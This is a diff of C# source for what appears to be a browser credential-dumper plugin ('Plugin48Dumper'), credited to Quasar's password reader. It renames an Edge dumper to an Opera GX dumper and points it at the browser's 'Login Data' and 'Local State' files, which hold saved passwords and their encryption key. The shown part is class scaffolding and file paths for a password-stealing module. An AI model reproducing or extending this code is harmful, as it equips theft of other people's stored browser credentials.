@@ -1,27 +1,24 @@
-﻿using System;
+﻿using Newtonsoft.Json.Linq;
+using Plugin.Abstractions48;
+using System;
 using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 using System.Data;
 using System.IO;
-using Plugin.Abstractions48;
+using System.Linq;
+using System.Text;
 using System.Text.RegularExpressions;
-using Newtonsoft.Json.Linq;
-using Newtonsoft.Json;
-using static Plugin48Dumper.clsChromeDumper;
-using System.Security.Cryptography;
+using System.Threading.Tasks;
 
 namespace Plugin48Dumper
 {
-    internal class clsEdgeDumper : clsDumper
+    internal class clsOperaGXDumper : clsDumper
     {
         /// <summary>
-        /// Acknowledgement: https://github.com/quasar/Quasar/blob/master/Quasar.Client/Recovery/Browsers/EdgePassReader.cs
+        /// Acknowledgement: https://github.com/quasar/Quasar/blob/master/Quasar.Client/Recovery/Browsers/OperaGXPassReader.cs
         /// </summary>
 
-        private string EdgeDir { get { return Path.Combine(ApplicationData, "Microsoft", "Edge"); } }
-        private string UserDataFile { get { return Path.Combine(EdgeDir, "User Data"); } }
+        private string OperaGxDir { get { return Path.Combine(ApplicationData, "Opera Software", "Opera GX Stable"); } }
+        private string UserDataFile { get { return Path.Combine(OperaGxDir, "User Data"); } }
         private string DefaultDir { get { return Path.Combine(UserDataFile, "Default"); } }
         private string LocalStateFile { get { return Path.Combine(UserDataFile, "Local State"); } }
         private string LoginFile { get { return Path.Combine(DefaultDir, "Login Data"); } }
@@ -32,11 +29,11 @@ namespace Plugin48Dumper
 
         public DataTable dtHelp = new DataTable();
 
-        public clsEdgeDumper()
+        public clsOperaGXDumper()
         {
-            Description = "Edge dumper.";
+            Description = "Opera GX dumper.";
             Usage = "foo";
-            Entry = "edge";
+            Entry = "operagx";
 
             dtHelp.Columns.Add("Action");
             dtHelp.Columns.Add("Description");
